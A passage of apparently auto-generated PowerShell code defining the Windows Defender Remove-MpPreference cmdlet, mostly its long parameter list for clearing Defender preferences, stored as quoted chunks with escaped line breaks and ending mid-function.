'Add-MpPreference' -Alias '*'\r\n        \r\n\r\nfunction Remove-MpPreference\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionPath},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionExtension},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionProcess},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ExclusionIpAddress},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('rtsd')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RealTimeScanDirection},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('qpiad')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${QuarantinePurgeItemsAfterDelay},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('rsd')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RemediationScheduleDay},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('rst')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RemediationScheduleTime},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('repcs')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RemoteEncryptionProtectionConfiguredState},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('repmbt')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RemoteEncryptionProtectionMaxBlock"
"Time},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('repa')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RemoteEncryptionProtectionAggressiveness},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('repe')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${RemoteEncryptionProtectionExclusions},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('bfpcs')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${BruteForceProtectionConfiguredState},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('bfpmbt')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${BruteForceProtectionMaxBlockTime},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('bfpa')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${BruteForceProtectionAggressiveness},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('bfpe')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${BruteForceProtectionExclusions},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('raat')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ReportingAdditionalActionTimeOut},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('rcto')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ReportingCriticalFailureTimeOut},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('rncto')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ReportingNonCriticalTimeOut},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('shri')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ServiceHealthReportInterval},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('rdsde')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ReportDynamicSignatureDroppedEvent},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('saclf')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ScanAvgCPULoadFactor},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('csbr')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${CheckForSignaturesBeforeRunningScan},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('spiad')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ScanPurgeItemsAfterDelay},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('soiie')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ScanOnlyIfIdleEnabled},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ScanParameters},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('scsd')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ScanScheduleDay},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('scsqst')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ScanScheduleQuickScanTime},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('scst')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ScanScheduleTime},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('tfsso')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ThrottleForScheduledScanOnly},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sigfagp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureFirstAuGracePeriod},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sigagp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureAuGracePeriod},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sigdufss')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureDefinitionUpdateFileSharesSources},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sigduoswo')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureDisableUpdateOnStartupWithoutEngine},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sfo')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureFallbackOrder},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('ssp','SecurityIntelligenceLocation','ssl')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SharedSignaturesPath},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sspsch','SecurityIntelligenceLocationUpdateAtScheduledTimeOnly')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SharedSignaturesPathUpdateAtScheduledTimeOnly},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sigsd')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureScheduleDay},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sigst')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureScheduleTime},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('siguci')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureUpdateCatchupInterval},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sigui')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureUpdateInterval},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sigbui')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureBlobUpdateInterval},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('sigbfs')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SignatureBlobFileSharesSources},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('mcupd')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${MeteredConnectionUpdates},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('anpws')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${AllowNetworkProtectionOnWinServer},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('ddtgp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableDatagramProcessing},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('ecwtb')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${EnableConvertWarnToBlock},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableCpuThrottleOnIdleScans},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${MAPSReporting},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SubmitSamplesConsent},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dae')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableAutoExclusions},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dpm')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisablePrivacyMode},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('rstt')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RandomizeScheduleTaskTimes},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('srt')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SchedulerRandomizationTime},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dbm')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableBehaviorMonitoring},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dips')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableIntrusionPreventionSystem},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dioavp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableIOAVProtection},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('drtm')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableRealtimeMonitoring},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dscrptsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableScriptScanning},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('darchsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableArchiveScanning},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dcfsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableCatchupFullScan},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dcqsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableCatchupQuickScan},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('demsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableEmailScanning},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('drdsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableRemovableDriveScanning},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('drp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableRestorePoint},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dsmndfsc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableScanningMappedNetworkDrivesForFullScan},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dsnf')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableScanningNetworkFiles},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('adsnftioav')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ApplyDisableNetworkScanningToIOAV},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${UILockdown},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('tiddefaci')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [long[]]\r\n    ${ThreatIDDefaultAction_Ids},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('tiddefaca')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]]\r\n    ${ThreatIDDefaultAction_Actions},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('unktdefac')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${UnknownThreatDefaultAction},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('ltdefac')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${LowThreatDefaultAction},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('mtdefac')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ModerateThreatD"
"efaultAction},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('htdefac')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${HighThreatDefaultAction},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('stdefac')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${SevereThreatDefaultAction},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dbaf')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableBlockAtFirstSeen},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${PUAProtection},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${CloudBlockLevel},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('cloudextimeout')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${CloudExtendedTimeout},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${EnableNetworkProtection},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${EnableControlledFolderAccess},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${AttackSurfaceReductionOnlyExclusions},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ControlledFolderAccessAllowedApplications},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${ControlledFolderAccessProtectedFolders},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string[]]\r\n    ${AttackSurfaceReductionRules_Ids},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]]\r\n    ${AttackSurfaceReductionRules_Actions},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('elcp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${EnableLowCpuPriority},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('efhc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${EnableFileHashComputation},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('efsobp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${EnableFullScanOnBatteryPower},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('ppurl')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ProxyPacUrl},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('proxsrv')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ProxyServer},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('proxbps')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ProxyBypass},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('fupo')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ForceUseProxyOnly},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dtlsp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableTlsParsing},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dftpp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableFtpParsing},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dhttpp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableHttpParsing},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('ddnsp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableDnsParsing},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('ddnstcpp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableDnsOverTcpParsing},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dsshp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableSshParsing},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('puc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${PlatformUpdatesChannel},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('euc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${EngineUpdatesChannel},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('duc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DefinitionUpdatesChannel},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dgr')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableGradualRelease},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('anpdl')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${AllowNetworkProtectionDownLevel},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('adpows')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${AllowDatagramProcessingOnWinServer},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('ednss')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${EnableDnsSinkhole},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dicf')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableInboundConnectionFiltering},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('drdpp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableRdpParsing},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dnppt')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableNetworkProtectionPerfTelemetry},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('tlps')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${TrustLabelProtectionStatus},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('astai')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${AllowSwitchToAsyncInspection},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('scso')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${ScanScheduleOffset},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dtdtf')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableTDTFeature},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dsmtpp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableSmtpParsing},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dquicp')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableQuicParsing},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('nprepmode')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${NetworkProtectionReputationMode},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('itdte')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${IntelTDTEnabled},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${AttackSurfaceReductionRules_RuleSpecificExclusions_Id},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${AttackSurfaceReductionRules_RuleSpecificExclusions},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('oobers')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${OobeEnableRtpAndSigUpdate},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('pms')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${PerformanceModeStatus},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('qsie')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${QuickScanIncludeExclusions},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('dcm')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${DisableCacheMaintenance},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [switch]\r\n    ${Force},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('rstpc')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [switch]\r\n    ${RemoveScanningThreadPoolCap},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Remove2')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = 